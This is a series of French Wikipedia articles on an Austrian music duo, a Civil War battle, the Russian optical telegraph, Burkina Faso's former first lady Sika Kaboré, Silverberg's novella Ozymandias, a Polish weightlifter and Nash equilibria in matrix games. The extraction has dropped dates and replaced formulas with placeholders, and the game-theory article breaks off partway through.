Les femelles de plusieurs espèces de ce genre ont la caractéristique d'incuber leur progéniture dans des poches spéciales ménagées dans les pétales antéro-latéraux, appelés "".
Liste des espèces.
Selon :

</doc>
<doc id="9625981" url="https://fr.wikipedia.org/wiki?curid=9625981" title="Seiler und Speer">
Seiler und Speer

Seiler und Speer est un duo autrichien, originaire de Bad Vöslau.
Histoire.
L'humoriste et acteur Christopher Seiler et le réalisateur Bernhard Speer collaborent depuis 2014. Seiler a composé des chansons et cherche quelqu'un pour l'accompagner sur scène. Speer devient son metteur en scène et producteur.
Les textes caricaturent la vie quotidienne dans le dialecte de la Basse-Autriche. Le projet devient un disque mélangeant les chansons sur le quotidien, l'amour et les chansons populaires. Le titre "Ham kummst" est numéro un en Autriche en 2015.
Le , le duo participe au concert de solidarité Voices for Refugees devant personnes sur la Heldenplatz à Vienne.
Aux Amadeus Austrian Music Award, Seiler und Speer remportent les prix : Groupe de l'année, Album de l'année, Chanson de l'année, Concert de l'année et Songwriter de l'année.
Horvathslos.
"Anton Horvath" est un personnage joué par Seiler. Horvath est un asocial, aux idées confuses, alcoolique et chômeur. Il croit qu'on le respecte alors qu'on se moque de lui. Le nom de "Horvathslos" est un jeu de mots avec "oawatslos", chômeur dans le dialecte bas-autrichien.

</doc>
<doc id="9625985" url="https://fr.wikipedia.org/wiki?curid=9625985" title="Bataille de Parker's Cross Roads">
Bataille de Parker's Cross Roads

La bataille de Parker's Cross Roads s'est déroulée le , dans le comté de Henderson, Tennessee, pendant la guerre de Sécession.
Contexte.
Alors que l'expédition dans la Tennessee occidental du brigadier général confédéré Nathan Bedford Forrest s'approche de sa conclusion, le brigadier général de l'Union , avec les brigades des colonels Cyrus L. Dunham et John W. Fuller, tente de couper les voies de retraite de Forrest sur la rivière Tennessee.
Bataille.
Les routes des Dunham et de Forrest les amènent à se rencontrer à Parker's Crossroads le . Des escarmouches commencent à 9 heures du matin, avec Forrest se positionnant initialement le long d'une crête boisée au nord-ouest de Dunham à l'intersection. L'artillerie confédérée gagne un avantage précoce. Dunham retire sa brigade sur () et se redéploie, faisant face au nord. Les fédéraux repoussent des attaques frontales feintes jusqu'à ce qu'ils soient attaqués sur les deux flancs par les troupes montées et démontées de Forrest.
Pendant une accalmie, Forrest envoie à Dunham une demande de reddition sans condition. Dunham refuse et se prépare à la prochaine attaque de Forrest quand la brigade de l'Union de Fuller arrive du nord et surprend les confédérés par une attaque sur leurs arrières ; les détachements confédérés chargé de la sécurité ont échoué à détecter l'approche de Fuller. « Chargez-les par les deux côtés » ordonne Forrest. Les confédérés renversent brièvement le front, repoussent Fuller, puis passent au travers de la force démoralisée de Dunham et se retirent vers le sud à Lexington, Tennessee.
Conséquences.
Après le combat, Forrest est capable de traverser la rivière Tennessee. Les deux camps réclament la victoire de cette bataille, mais les déclarations confédérées apparaissent avoir plus de légitimité.
Préservation du champ de bataille.
Le terrain sur lequel s'est déroulée la bataille de Parker’s Crossroads est maintenant traversé d'est en ouest par l"'Interstate 40" et du nord au sud par la "Tennessee State Route 22", situé à mi-chemin entre Memphis et Nashville. La ville proche a grossi considérablement depuis l'ouverture de l'autoroute inter-états à la fin des années 1960. Les promoteurs et les investisseurs s'intéressent constamment à la région du champ de bataille pour le développement des affaires, rendant les efforts de préservation particulièrement urgents.
Les () du champ de bataille ont été sauvés jusque-là par le conjointement avec un groupe local, "The Parker's Crossroads Battlefield Association". En 2011, le Trust lance une campagne pour préserver que qu'il appelle « l'étendue clé » (keystone tract), la dernière pièce non-préservée du terrain du vieux champ de bataille. C'est une parcelle de () où avait été mise la plupart de l'artillerie confédérée. Beaucoup de personnes voulant la préservation pensent que si le terrain tombe dans les mains des promoteurs commerciaux, on ne pourra plus interpréter le champ de bataille d'une manière significative.

</doc>
<doc id="9625997" url="https://fr.wikipedia.org/wiki?curid=9625997" title="Télégraphe optique russe">
Télégraphe optique russe

Le Télégraphe optique russe est une déclinaison du Télégraphe Chappe, installé par un stationnaire de télégraphe Chappe dans les années 1830 sur de longues distances à partir de la capitale russe et qui constituait la ligne la plus étendue d'Europe.
Histoire.
L'immense étendue de l'empire russe constituant un obstacle continuel à la transmission des ordres envoyés de la capitale, l'autorité du Tsar, un "grand nombre de personnes avaient essayé à Saint-Pétersbourg de construire des télégraphes", mais sans succès. Parmi elles, l'abbé Valentin Haüy, connu pour sa méthode d'éducation des aveugles, a fait une proposition sans suite, dans une brochure publiée en 1805. Les journaux russes annoncèrent peu après, en 1808, qu'un autre Français, Volque, allait équiper Saint-Pétersbourg d'un télégraphe aérien, mais il n'obtint pas le marché, pas plus qu'au Danemark, où il espérait placer son invention. Un premier télégraphe optique est déployé en 1824, de la capitale au lac Ladoga.
Des expérimentations de télégraphie électrique sont aussi effectuées dans la capitale russe. En 1833, le baron Schilling y fit plusieurs essais avec un télégraphe électromagnétique composé d'un système à aiguille et d'un code utilisé pour indiquer les caractères. Le baron Schilling avait imaginé cinq fils de platine unissant deux stations, isolés au moyen de gomme laque, et contenus dans une corde de soie. La station du départ possédait une espèce de clavier, dont chaque touche, en rapport avec l'un des fils, servait à y diriger le courant, et à mettre ainsi en action l'aiguille magnétique correspondante, située à la station extrême. Cette dernière comportait cinq aiguilles aimantées, placées chacune au milieu d'un galvanomètre. Les dix mouvements formés par les cinq aiguilles magnétiques, servaient à désigner les dix chiffres de la numération, lesquels, à l'aide d'un dictionnaire spécial, représentaient les signaux télégraphiques. Le baron Schilling fit plusieurs expériences sous les yeux de l'empereur de Russie. Quelque temps après, son décès empêcha de continuer les essais sur une échelle plus étendue. 
Entretemps, en 1831, un ancien employé de Chappe, Pierre-Jacques Chatau, renvoyé de l'Administration télégraphique au moment de la Révolution de 1830, est venu proposer au tsar un système utilisant le télégraphe de Chappe mais en diminuant le nombre des signaux. Sa proposition a été acceptée et il a établi en Russie deux lignes de télégraphie aérienne, l'une, simplement expérimentale, de huit postes entre Saint-Pétersbourg et l'île de Cronstadt, et l'autre, beaucoup plus longue de cent quarante-huit postes entre Saint-Pétersbourg et Varsovie. Toutes les deux avaient une vocation militaire. 
Un système de lanterne, fonctionnant à l'huile, permettait de transmettre la nuit. Quatre employés étaient attachés au service de chacune des 220 stations et le temps de trajet d'une dépêche était de dix minutes, aller et retour. La première ligne a été ouverte en , la seconde à la fin de . En 1839, la Russie achève son télégraphe optique reliant Saint-Pétersbourg à Varsovie. Cette ligne est à son ouverture la plus étendue de l'Europe. L'ingénieur français chargé de l'installation a été récompensé par une pension de et la croix de Saint-Vladimir.
Dans les années 1840, la Russie est aussi le théâtre d'expériences pour la télégraphie électrique, effectuées par Moritz von Jacobi, nommé en 1847 membre titulaire de l’Académie des sciences de Russie. Peu après il devint conseiller d'État du tsar. Pour déployer le télégraphe établi entre Tsarkoïé-Selo et Saint-Pétersbourg, sur 25 kilomètres, il employa un circuit entièrement métallique, les fils étant enveloppés d'une couche de résine élastique et enfoncés dans la terre. Après des expériences faites au cours de l'année 1842 « à une distance de 9 verstes » (environ 9 kilomètres), un parcours plus long a été testé avec succès. Une petite batterie galvanique servait à donner une force plus que suffisante pour faire fonctionner ce télégraphe, qui a en partie inspiré celui d'Alexander Bain, plus perfectionné. Cette technologie est utilisée en 1849, lorsqu'une ligne souterraine est déployée entre la capitale et Moscou et des ingénieurs russes sont envoyés à l'étranger pour compléter leurs connaissances.
Le Télégraphe optique russe a été utilisé jusqu'en 1854, époque d'arrivée du télégraphe électrique dans la capitale russe. L'année précédente, le Tsar a décidé un grand programme d'investissement et organisé la première ligne électrique entre Saint-Pétersbourg, Varsovie et Koenigsberg. Werner von Siemens se rend dans la capitale russe, dans cette perspective, dès le début 1852, en passant par Riga. En 1855, une ligne construite par Werner von Siemens et Johann Georg Halske part en direction de Sébastopol, mais elle arrivera trop tard pour le début de la guerre de Crimée. Lorsque les hostilités sont déclenchées, elle n'est parvenue qu'à Simferopol.

</doc>
<doc id="9625999" url="https://fr.wikipedia.org/wiki?curid=9625999" title="Adjoavi Sika Kaboré">
Adjoavi Sika Kaboré

Sika Kaboré, née Adjoavi Sika Vovor le à Lomé (Togo), est l'épouse de Roch Marc Christian Kaboré, président du Burkina Faso de 2015 à 2022.
Juriste de formation, elle est la fondatrice et la présidente de la Fondation "KIMI".
Biographie.
Famille.
Sika Kaboré est la fille de Mawupé Valentin Vovor, professeur de médecine, et d'Emilia Moreira, sage-femme, enseignante. Elle est la seconde d'une famille de cinq enfants.
Sika Kaboré est mariée depuis 1982 à Roch Marc Christian Kaboré qu’elle a rencontré lors de ses études en France. Le couple a 3 enfants.
Formation.
Sika Kaboré a effectué ses études supérieures au Togo et en France après un baccalauréat en lettres obtenu à Lomé.
En 1979, elle obtient une maîtrise de droit privé à l'université du Bénin à Lomé (actuelle université de Lomé).
À l'issue de son second cycle universitaire, elle rejoint l'Université de Bourgogne à Dijon en France où elle poursuit un troisième cycle universitaire et obtient en 1980 un certificat en administration des entreprises au sein de l'IAE de Dijon.
Carrière et activités publiques.
Sika Kaboré effectue sa carrière professionnelle au sein de la Chambre de commerce et d'industrie du Burkina Faso (CCI-BF) à Ouagadougou, où elle entre en qualité de chargée d’études juridiques, et siège au sein de son Comité de Direction. En 2014, elle a été nommée conseiller technique du directeur général de la CCI-BF, chargée de l'administration des commissions consulaires et de l'organisation de la représentation de la CCI-BF dans les instances nationales et internationales.
Outre ses activités professionnelles, le bien-être et la promotion de la femme figurent parmi ses engagements associatifs. C'est également en tant que Première Dame qu'elle milite pour la promotion et l'épanouissement de la femme au Burkina Faso : respect des droits et de l'intégrité physique et morale, accès à la santé, contribution des femmes au développement du pays.
La Fondation "KIMI", le Comité inter-africain sur les pratiques traditionnelles ayant effet sur la santé des femmes et des enfants] (CI-AF) et le Groupe d'action de lobbying et de plaidoyer (GALOP) figurent parmi les structures associatives utilisées pour promouvoir le droit des femmes.
La fondation Kimi.
Sensible au respect et à la promotion des droits de l’Homme, Sika Kaboré s’investit depuis plusieurs années pour la cause de la femme et des enfants. Parallèlement à ses activités professionnelles, elle crée ainsi en 2006 l'association d'aide à la santé préventive Kimi (« parapluie » ou « protection » par analogie en langue dioula) et l’anime.
L’action de l’association s’articule autour de trois axes stratégiques : un programme de sensibilisation à la lutte contre les cancers génitaux chez la femme, une contribution à l'élimination du trachome et des maladies diarrhéiques et une contribution au renforcement à la lutte contre la drépanocytose. Elle vise à prévenir les principales maladies affectant les femmes et les enfants. Au Burkina Faso, les cancers génitaux occupent le premier rang des cancers chez la femme. Beaucoup de facteurs (sociaux, culturels et économiques) rendent difficiles la prévention et même la prise en charge des personnes affectées, malgré les efforts fournis par le gouvernement, notamment par la prise de la décision de rendre les soins gratuits aux femmes et aux enfants de moins de 5 ans.
Activités de sensibilisation, formation, dépistage et appui.
Les femmes du milieu rural ont en général moins accès aux structures de santé, d'éducation et sont plus pauvres, donc plus vulnérables. La fondation met ainsi l'accent sur l'organisation de campagnes de sensibilisation des femmes-leaders et de formation des prestataires sanitaires, notamment dans les villes comme Dédougou (2008), Diapaga (2009), Po (2010), Komsilga (2014), Boussouma (2016), Titao et Gaoua (2017), Manga (2018). Plus de 100 000 femmes et près de 150 prestataires de santé ont eu accès à ces services. Une semaine du Ruban Rose a par ailleurs été organisée en 2008 et 2014 à Ouagadougou, en 2009 à Bobo Dioulasso et à Banfora, en 2011 à Ouahigouya, en 2012 à Koudougou, en 2017 à Gaoua et en 2018 à Manga.
La fondation Kimi a par ailleurs procédé à l'accompagnement de diverses associations dans l'organisation de campagnes de dépistages de cancers du col de l'utérus, tout en facilitant l'implantation du programme Be Healthy Be Mobile (BHBM) au Burkina Faso, qui vise à favoriser l'utilisation du téléphone portable comme outil de sensibilisation pour le dépistage et le contrôle des cancers féminins.
Activités de plaidoyer et de lobbying.
Des conférences multidisciplinaires de sensibilisation et de plaidoyer sur le dépistage et la prise en charge du cancer ont été organisées en français en en langues locales en 2006, 2008 et 2012 à Ouagadougou. Ces conférences destinées à la fois au grand public, aux professionnels de santé et aux politiques ont eu pour objectifs de faire la promotion de l'utilité de la mise en place des registres des cancers ainsi que de la prise en charge multidisciplinaire des cancers à travers la mise en place des Réunions de Concertation Pluridisciplinaire (RCP).
Avec l'appui de la commission de l'Union économique et monétaire ouest-africaine (UEOMA), la fondation Kimi a organisé en à Ouagadougou la Rencontre technique régionale des pays membres de l'UEOMA, en présence des ministres de la santé, sous le thème de la lutte contre le cancer, état des lieux et perspectives. Elle s'est achevée par le lancement de l'Initiative d'un engagement solidaire pour lutter contre les cancers couronnées par l'« Appel de Ouagadougou ».
En lien avec le ministère de l'Agriculture, un programme de vulgarisation de la culture du Niébé a été mis en place pour permettre aux femmes de contribuer au développement du Burkina. L'ambition est d'étendre ce programme aux autres régions du pays après l'expérience réussie dans deux régions pilotes où il a permis aux femmes d'acquérir une autonomie.
Comité inter-africain sur les pratiques traditionnelles ayant effet sur la santé des femmes et des enfants (CI-AF).
Ambassadrice du Comité inter-africain sur les pratiques traditionnelles ayant effet sur la santé des femmes et des enfants (CI-AF) depuis 2016, Sika Kaboré œuvre à ce titre contre les pratiques traditionnelles affectant la santé des femmes et des enfants sur les plans national, régional et international. Le CI-AF regroupe 29 pays africains et 17 pays non-africains. Sa principale mission est de contribuer à l'amélioration de l'état de santé, du statut social, économique, politique des femmes et des enfants africains.
Groupe d'action, de lobbying et de plaidoyer (GALOP) pour la lutte contre les mutilations génitales féminines (MGF) et le mariage d'enfants (ME).
Malgré les nombreuses initiatives gouvernementales et celles de la société civile, les mutilations génitales féminines (MGF) et le mariage d'enfants (ME) constituent une préoccupation et un blocage à l'épanouissement de la jeune fille et de la femme au Burkina Faso. Le Groupe d'action, de lobbying et de plaidoyer (GALOP), présidée depuis 2017 par Sika Kaboré, vise à éliminer ces pratiques. Le GALOP s'implique dans la lutte contre les mariages d'enfants ainsi que les MGF, notamment l'excision, avec l'accompagnement d'organisations de la société civile et des partenaires techniques et financiers. Sika Kaboré à travers le GALOP souhaite renforcer les actions déjà initiées par le Burkina Faso et construire un vaste mouvement national contre les pratiques traditionnelles néfastes que sont les mutilations génitales féminines et les mariages d'enfants. Parmi les actions entreprises figurent notamment des plaidoyers auprès de représentants de la nation, et des actions de sensibilisation, notamment par des représentants de la société civile (artistes, femmes, etc.).
L'activité de Sika Kaboré en tant que Première dame.
Au cours du mandat de son mari, Sika Kaboré s’engage en faveur de l'autonomisation des femmes et dans la lutte contre l’excision.
En , elle se rend à New York dans le cadre de la soixantième session de la Commission de la Condition de la Femme des Nations unies. Au cours de son séjour, elle participe notamment à la Concertation Francophone sur la lutte contre les violences faites aux femmes et aux filles, organisée par Madagascar et l’Organisation Internationale de le Francophonie. Elle préside le Panel organisé par le Burkina en partenariat avec la Tanzanie, l’Italie et l’Iran, appuyé par le Fonds des Nations unies pour la population (FNUAP) et le Fonds des Nations unies pour l'enfance (UNICEF), sur le thème: (ODD). Sika Kaboré insiste sur la nécessité d’instaurer une . Elle est également oratrice d’Honneur au plaidoyer organisé par le FNUAP sur les pratiques néfastes aux filles et aux femmes à travers le monde, autour du thème : « Time is now, let’s end harmful practices against women and girls by 2030 », durant lequel elle a appelé toutes les Nations, ainsi que chacun de nous à agir dès aujourd’hui.
Au cours d’une conférence de presse à Ouagadougou en , Sika Kaboré réaffirme son soutien total à l’élimination définitive de l’excision au Burkina Faso.
Fin , Sika Kaboré conduit une délégation en Arabie Saoudite en tant qu’Ambassadrice de bonne volonté du Comité inter-africain de lutte contre les pratiques traditionnelles affectant la santé des femmes et des enfants (CI-AF) pour « aller faire un plaidoyer en faveur du financement du programme quinquennal des activités du CI-AF ». Elle déclare à cette occasion « Quand nous parlons de pratiques traditionnelles, il y a celles qui sont bonnes et celles qui sont néfastes. Et là, pour ce séjour, il s’agissait effectivement d’aller défendre un dossier sur les MGF (l’excision). »
Pour un cadre de vie sain.
Le à Ouagadougou, l’épouse du chef de l'État burkinabè lance la campagne de solidarité citoyenne pour l'accès aux toilettes « Fasotoilettes 2017 », menée par l’ONG IRC Burkina Faso en collaboration avec le ministère de l’Eau et de l’Assainissement burkinabè, les ONG Water Aid et l'association Eau Vive Internationale, ainsi que la fondation KIMI.
Sika Kaboré déclare à cette occasion être affligée par les difficultés d'accès à des toilettes de nombreuses parties de la population.

</doc>
<doc id="9626004" url="https://fr.wikipedia.org/wiki?curid=9626004" title="Ozymandias (nouvelle)">
Ozymandias (nouvelle)

 Ozymandias (titre original : "Ozymandias") est un roman court de science-fiction de Robert Silverberg.
Titre.
"Ozymandias" est l'un des noms portés par l'illustre Ramsès II, pharaon de l'Égypte antique.
Au , c'est le titre d'un poème de Shelley, écrit en 1817, faisant référence à ce pharaon : Ozymandias, ainsi qu'un poème d'Horace Smith, portant sur le même sujet et aussi intitulé "Ozymandias".
Publications.
Entre 1958 et 2014, la nouvelle a été éditée à une quinzaine de reprises dans des recueils de nouvelles de Robert Silverberg ou des anthologies de science-fiction.
Publications aux États-Unis.
La nouvelle est parue en sous le titre "Ozymandias" dans le magazine "".
Elle a ensuite été régulièrement rééditée dans divers recueils de Robert Silverberg et diverses anthologies.
Publications en France.
La nouvelle est publiée en France :
Publications dans d'autres pays européens.
La nouvelle paraît en Allemagne en juillet 1966 sous le titre "Die Erbschaft des Todes".
La nouvelle est publiée en Espagne en 1981 sous le titre "Ozymandias".
Elle est aussi publiée en Croatie en 1983 sous le titre "Ozymandias".
Résumé.
Le narrateur explique que l'expédition intersidérale à laquelle il appartient, composée principalement de militaires, et subsidiairement d'archéologues et d'historiens, arrive sur une planète inconnue d'un système stellaire lointain. Cette expédition a pour but de cartographier une partie des systèmes stellaires d'une région galactique, d'entrer en contact avec des extraterrestres, de déterminer si des ennemis potentiels existent, de découvrir de nouvelles armes, de procéder à des recherches scientifiques d'ordre archéologique.
La planète sur laquelle le vaisseau spatial se pose apparaît inhabitée. Des vestiges de ruines très anciennes montrent qu'elle a connu jadis une civilisation intelligente, aujourd'hui disparue. Le commandant de bord souhaiterait ne pas s'attarder sur la planète, mais face à la fronde des scientifiques, il est obligé de leur laisser une semaine pour qu'ils étudient les ruines. Les scientifiques se répartissent en trois groupes et procèdent aux premières recherches. Si deux équipes ne trouvent rien, en revanche une équipe découvre, à moitié enfoui sous terre, un antique robot qui semble en état de fonctionnement. Ils parviennent à le mettre en marche et le robot leur révèle que le peuple qui habitait la planète était les Thaïquens. L'équipe nomme le robot "Ozymandias", en référence à un poème de Shelley, et décide de taire sa découverte aux militaires. À leur retour, ils n'évoquent donc pas le robot.
Néanmoins le commandant n'est pas dupe et fait subtiliser le robot durant la nuit, le faisant ramener à bord. Le lendemain, il explique aux archéologues que l'expédition rentre immédiatement sur Terre, car le robot a dans ses mémoires les schémas d'armes nouvelles extrêmement puissantes : autant que ces armes soient la propriété des États-Unis plutôt que celle de leurs ennemis.
La nouvelle se termine par les phrases suivantes qui renferment la détresse du narrateur face à la peur de voir ces nouvelles armes anéantir un jour la Terre : « Je pensais à la cargaison mortelle que nous transportions, à ce robot si pressé de dégorger son fonds d'informations. Je songeais à ce qui allait arriver lorsque nos scientifiques sur Terre apprendraient ses leçons. L'œuvre des Thaïquens était désormais la nôtre. J'ai repensé au vers de Shelley : .

</doc>
<doc id="9626012" url="https://fr.wikipedia.org/wiki?curid=9626012" title="Liste des présidents de l'American Library Association">
Liste des présidents de l'American Library Association

L'American Library Association est la principale association professionnelle de bibliothécaires aux États-Unis. Cette page liste ses présidents depuis sa création en 1876.

</doc>
<doc id="9626017" url="https://fr.wikipedia.org/wiki?curid=9626017" title="Tadeusz Rutkowski">
Tadeusz Rutkowski

Tadeusz Rutkowski, né le à Cracovie, est un haltérophile polonais. 
Carrière.
Tadeusz Rutkowski participe aux Jeux olympiques de 1976 à Montréal et aux Jeux olympiques de 1980 à Moscou et remporte la médaille de bronze.

</doc>
<doc id="9626018" url="https://fr.wikipedia.org/wiki?curid=9626018" title="Équilibres et jeux matriciels">
Équilibres et jeux matriciels

En théorie des jeux, un équilibre de Nash définit une situation dans laquelle aucun joueur ne peut modifier seul sa stratégie sans affaiblir sa position personnelle. La notion d'équilibre a pris un essor considérable au et se trouve désormais au centre de la théorie des jeux. Depuis 1928, lorsque John von Neumann initie la théorie des jeux avec son théorème du minimax, les équilibres deviennent un outil essentiel d'analyse dans des domaines variés tels que l'économie, les sciences sociales et les sciences politiques. En 1958, John Forbes Nash décrit un théorème qui assure que tout jeu à nombre de joueurs et stratégies finis possède un équilibre pour les stratégies mixtes. La théorie des jeux se consacre, entre autres, à calculer si ces états peuvent être atteints, efficacement en pratique, avec des agents rationnels. En 1994, Christos Papadimitriou crée la classe de complexité PPAD dans laquelle sont repris les calculs des équilibres de Nash pour les jeux à plusieurs joueurs.
Notion d'équilibre.
Dans la théorie des jeux, l'équilibre ou l'équilibre de Nash, nommé d'après John Forbes Nash, est un concept de solution dans lequel l'ensemble des choix faits par plusieurs joueurs, connaissant leurs stratégies réciproques, est devenu stable du fait qu'aucun ne peut modifier seul sa stratégie sans affaiblir sa position personnelle.
Cela signifie que n'importe quel jeu pourrait, en principe, atteindre un état de calme où personne n'aurait l'intention de changer son comportement. Cette situation soulève immédiatement plusieurs questions : est-ce possible dans la réalité de notre monde économique ou politique ? Est-il possible de calculer cet équilibre efficacement ?
Il est important de résoudre cette deuxième question. Car ce principe d'équilibre est au-delà de tout outil conceptuel, c'est une prédiction de comportements stratégiques rationnels par des agents en situation de conflit, un contexte pourtant dénué de logique et de calculs. La crédibilité de cette solution envers les économistes dépend directement de l'efficacité avec laquelle la théorie des jeux peut la proposer.
Matrices de gain.
La matrice des gains, matrice de coût ou encore matrice des paiements (anglicismes issus de "payoff matrix") est un moyen de représenter un jeu sous forme stratégique par un tableau indiquant les gains (ou paiements) associés à chaque action en fonction des actions de l'autre joueur.
Typiquement, une matrice de gain pour les jeux à somme nulle se représente comme suit :
Lorsque le joueur 1 choisit sa stratégie 2 et le joueur 2 choisit sa stratégie 1 : le joueur 1 gagne 3 et le joueur 2 perd 3.
Lorsque le joueur 1 choisit sa stratégie 1 et le joueur 2 choisit sa stratégie 1 : le joueur 1 perd 2 et le joueur 2 gagne 2.
Une matrice de gain pour les jeux à somme non nulle se représente comme suit :
Lorsque le joueur 1 choisit sa stratégie 2 et le joueur 2 choisit sa stratégie 1 : le joueur 1 perd 10 et le joueur 2 gagne 5.
Nous prendrons soin de toujours placer le joueur 1 à gauche et le joueur 2 en haut.
Équilibre dans les jeux deux joueurs à somme nulle.
Pour les stratégies pures.
Soit un joueur qui dispose d'un ensemble de choix fini formula_1; une stratégie pure est un choix formula_2.
Point-selle du Minimax.
Jeu 1
Soit "k" le nombre de stratégies pures disponibles pour le joueur 1 et "n" le nombre de stratégies pures disponibles pour le joueur 2. On numérote de 1 à "k" les stratégies à la disposition du J1 et de 1 à "n" celles du J2. Prenons un exemple facile de jeu où "n" = "k" = 3.
Voici la matrice de gain :
Le joueur 1 se dit : « Si je joue 1, je risque de perdre 1 unité, et si je joue 3 d'en perdre 3; mais si je joue 2, je gagne une unité dans le pire des cas. »
Le joueur 2 se dit : « Si je joue 1, je risque de perdre 2 unités, et si je joue 2 d'en perdre 2; mais si je joue 3 mes pertes sont limitées à une unité dans le pire des cas.
Le joueur 1, reconstituant le raisonnement du joueur 2 à choisir sa stratégie 3 pour limiter ses pertes, est conforté dans son choix.
Le joueur 2, reconstituant le raisonnement du joueur 1 à choisir sa stratégie 2, est conforté dans son choix (il perdrait 2 s'il choisissait autrement).
Aucun des joueurs n'est prêt à changer sa stratégie car ce sont les choix les plus rationnels. 
Par exemple, si le joueur 1 devient gourmand et change sa stratégie pour gagner 1,5 ou 3 unités, sachant que le joueur 2 joue intelligemment et donc sa stratégie 3, le joueur 1 ne gagnerait plus que 0 unité, au lieu de 1. Il n'a donc aucun intérêt à changer sa stratégie. Ce raisonnement est réciproque pour le joueur 2.
En effet, selon la proposition, nous trouvons bien un équilibre :
formula_3 tandis que formula_4
Le minimax et le maximin sont égaux; la ligne où le minimax est atteint et la colonne où le maximin est atteint indiquent un point d'équilibre.
Jeu 2
Similairement au jeu 1, le joueur 1 va choisir sa stratégie 2 pour minimiser les pertes, ici 1,01 unité. Le joueur 2 choisira sa stratégie 3 où il perdra au pire 1,02 unité. 
Le joueur 1 anticipe la décision du joueur 2 et se rend compte qu'il va bel et bien perdre 1,01 unité et choisira alors sa stratégie 1 pour gagner 1,02 unité. Le joueur 2 va lui aussi anticiper cette décision et choisir sa stratégie 2 pour gagner 1,03 unité, etc. Aucune stratégie pure de la part des deux joueurs ne parviendra à s'imposer.
Toujours par rapport à la proposition, nous pouvons remarquer qu'il n'y a aucun équilibre : 
formula_5 tandis que formula_6
Pour les stratégies mixtes.
Soit un joueur qui dispose d'un ensemble de choix fini formula_1; une stratégie mixte est l'attribution d'une certaine distribution de probabilité sur l'ensemble des stratégies pures formula_8. Bien entendu, chaque stratégie pure formula_8 est une stratégie mixte qui choisit formula_10 avec une probabilité de 1.
Théorème du Minimax.
En 1928, John von Neumann démontre son théorème du minimax. Il assure que, pour un jeu non coopératif opposant deux joueurs, à nombre fini de stratégies pures et à somme nulle, il existe au moins une situation d'interaction stable, à savoir une situation dans laquelle aucun des deux joueurs n'a intérêt à changer sa stratégie mixte si l'autre ne la change pas.
Ce théorème est un cas particulier du théorème fondamental de la théorie des jeux à n joueurs de John Forbes Nash, démontré en 1950.
À la différence du cas des points-selle vu précédemment, il existe toujours un équilibre dans un jeu à somme nulle et à deux joueurs aux stratégies mixtes.
Explications :
Soit la stratégie mixte du joueur 1 un vecteur colonne formula_11 et le joueur 2 choisit la colonne j, alors le gain moyen du J1 est formula_12. Similairement, soit la stratégie mixte du J2 représentée par le vecteur colonne formula_13 et le J1 choisit la ligne i, alors le gain moyen du J1 est formula_14.
De manière plus générale, si J1 utilise sa stratégie mixte formula_1 et J2 utilise sa stratégie mixte formula_16, le gain moyen pour le J1 est de : 
formula_17
Désormais, un couple de stratégies mixtes formula_18 est un équilibre de Nash pour formula_19 lorsque :
Exemple :
Soit la matrice de gain formula_19 :
Analysons premièrement ce jeu du point de vue du joueur 1. Supposons qu'il joue sa stratégie "une" 3/5 du temps et "deux" 2/5 du temps de manière aléatoire (formula_1 vaut ici formula_28). Dans ce cas :
Sur la durée, le J1 est assuré d'être rentable. Mais peut-il améliorer cette stratégie pour qu'il ait un gain positif quoi que J2 choisisse ?
Définissons formula_29 comme la quantité de fois que J1 choisit sa stratégie 1. Commençons par trouver p tel que J1 gagne le même montant qu'il choisisse sa stratégie 1 ou sa stratégie 2 :
formula_30
formula_31
formula_32
formula_33
Donc formula_1 = formula_35. En moyenne, J1 gagne −2(7/12) + 3(5/12) = 1/12 quoi que J2 choisisse.
Peut-il faire mieux ? Pas si J2 joue intelligemment. En fait, J2 peut utiliser la même procédure et il se retrouvera avec formula_16 = formula_35 qui lui garantit une perte moyenne d'au plus 1/12.
On dit alors que la valeur du jeu formula_38 vaut formula_39.
Résolution des matrices de gain 2x2.
Soit formula_40
Nous supposons qu'il n'y a aucun point-selle.
Si formula_41 alors formula_42 sinon b serait un point-selle. Si formula_42, alors formula_44 sinon c serait un point-selle.
Donc, formula_45.
En résumé, si formula_46, formula_47, alors formula_48.
Comme vu précédemment, reprenons la formule du gain moyen pour le j1 avec formula_1 = formula_50 lorsque le j2 utilise sa colonne 1 et 2 :
formula_51
Lorsqu'on résout formula_29, on trouve : 
formula_53
Vu qu'il n'y a aucun point-selle, formula_54 et formula_55 sont soit tous deux strictement positifs soit tous deux strictement négatifs, donc formula_56
Le calcul de la perte moyenne de j2 est similaire et nous obtenons :
formula_57
Cette similarité prouve que le jeu a une valeur et que les joueurs ont leur stratégie optimale (propriété du théorème minimax pour les jeux à stratégies finies).
Exemple 1 : 
Exemple 2 : 
Dans ce dernier exemple, q devrait être entre 0 et 1. Il ne l'est pas car il existe un point-selle. Dans la matrice A, "1" est un point-selle donc p vaut 0, q vaut 1 et v vaut 1.
Résolution par suppression de la stratégie dominante.
Parfois, de grandes matrices peuvent être réduites en taille jusqu'à, dans le meilleur des cas, une matrice 2x2. Pour y parvenir, il faut supprimer les lignes et les colonnes qui sont mauvaises (inutiles) pour les deux joueurs. 
Tout ce qui peut être atteint avec une ligne ou une colonne dominante peut être atteint au moins aussi bien avec la ligne ou la colonne dominée.
Donc, la suppression d'une colonne ou d'une ligne dominante ne change pas la valeur du jeu. Cependant, il existe peut-être une stratégie optimale qui utilisait cette ligne et cette colonne dominante et disparaîtra avec sa suppression, mais il restera toujours au moins une stratégie optimale autre part.
Dans le cas d'une suppression d'une colonne ou d'une ligne strictement dominante, l'ensemble des stratégies optimales reste inchangé.
Exemple : 
Nous allons itérer la procédure successivement sur les lignes et colonnes sur la matrice A.
Généralisation aux matrices NxN.
Connaissances supposées : la programmation linéaire.
De manière informelle, nous voulons trouver des variables qui sont des distributions de probabilité sur différents choix formula_58. Ces probabilités doivent suivre deux inégalités linéaires : formula_59 et formula_60 pour tout formula_61.
Notre but est de maximiser le pire cas (le minimum) de notre gain, sur toutes les colonnes que l'adversaire peut jouer. Plus formellement, on assignera une variable formula_38 qui représente le minimum et on donnera comme contrainte que notre gain soit au moins formula_38 pour chaque colonne et que notre objectif soit de maximiser formula_38. En résumé nous avons :
Variables : formula_65 et formula_38.
Objectifs : Maximiser formula_38.
Contraintes :
Ce problème est un programme linéaire et peut donc être résolu. 
Méthode du simplexe.
Connaissances supposées : l'algorithme du simplexe.
L'algorithme le plus courant est la méthode du simplexe, introduite par George Dantzig à partir de 1947. La plupart des exemples sont résolus en temps polynomial mais ce n'est pas garanti. Certains cas peuvent dépasser cette complexité. Nous poursuivrons avec un exemple :
Déclinons formula_38 pour les deux joueurs : formula_74 que j1 cherche à maximiser et formula_75 que j2 cherche à minimiser.
Nous avons donc :
